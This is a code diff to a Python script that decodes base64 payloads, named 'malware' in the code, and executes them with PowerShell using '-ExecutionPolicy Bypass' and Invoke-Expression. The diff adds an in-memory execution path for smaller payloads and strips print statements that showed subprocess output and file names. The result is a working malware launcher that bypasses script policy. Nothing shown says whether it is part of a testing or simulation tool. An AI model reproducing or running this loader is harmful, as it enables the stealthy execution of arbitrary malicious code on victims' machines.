@@ -104,13 +104,22 @@ def execute_process(script_content: bytes, extension: str, malware: str) -> None
                 # Run a powershell script from the IEX via temp file  that wil be deleted in the end of the process
                 normalized_path = None
                 try:
-                    with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=f".{extension}") as temp_script:
-                        temp_script.write(
-                            f"$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{malware}')); Invoke-Expression $script")
-                        temp_script_path = temp_script.name
-                    normalized_path = os.path.normpath(temp_script_path)
-                    powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-File', normalized_path]
-                    execution(powershell_command, normalized_path)
+                    if len(base64.b64decode(malware.encode("utf-8")).decode("utf-8")) < 7000:
+                        ps_command = (
+                            f'powershell -ExecutionPolicy Bypass -Command '
+                            f'"$decodedScript = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\'{malware}\')); '
+                            f'Invoke-Expression $decodedScript"'
+                        )
+
+                        execution(ps_command, check=True)
+                    else:
+                        with tempfile.NamedTemporaryFile(mode="w", delete=False, suffix=f".{extension}") as temp_script:
+                            temp_script.write(
+                                f"$script = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{malware}')); Invoke-Expression $script")
+                            temp_script_path = temp_script.name
+                        normalized_path = os.path.normpath(temp_script_path)
+                        powershell_command = ['powershell', '-ExecutionPolicy', 'Bypass', '-File', normalized_path]
+                        execution(powershell_command, normalized_path)
                 except subprocess.CalledProcessError:
                     if normalized_path is not None:
                         if os.path.exists(normalized_path):
@@ -156,9 +165,7 @@ def execution(command: str, normalized_path: str = None, check: bool = False) ->
     """
     try:
         if WIN:
-            result = subprocess.run(command, shell=check, check=True)
-            print(result.stdout)
-            print(result.stderr)
+            subprocess.run(command, shell=check, check=True)
         elif LIN:
             subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
     except subprocess.CalledProcessError:
@@ -176,8 +183,6 @@ def main():
     # Looping throw the keys in the json format
     for index, key in enumerate(response):
         # Create new file name via the index and file name
-        print(key)
-        print(response[key]["fullName"])
         filename = response[key]["fullName"].split(".")
         extension = filename[-1]
 
